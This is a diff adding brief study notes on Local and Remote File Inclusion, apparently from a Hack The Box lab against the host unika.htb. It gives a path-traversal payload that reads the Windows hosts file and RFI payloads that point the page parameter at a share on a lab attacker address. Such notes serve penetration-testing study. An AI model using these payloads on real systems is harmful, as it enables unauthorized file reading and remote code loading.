@@ -1,0 +1,16 @@
+LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.
+
+Examples:
+LFI
+index.php?=../../../../../../../../windows/system32/drivers/etc/hosts
+
+The file inclusion, in this case, was made possible because in the backend the include() method of PHP is being used to process the URL parameter page for serving a different webpage for different languages. And because no proper sanitization is being done on this page parameter, we were able to pass malicious input and therefore view the internal system files.
+
+
+
+RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc
+
+RFI
+"french.html", "//10.10.14.6/somefile",
+
+http://unika.htb/?page=//10.10.14.25/somefile
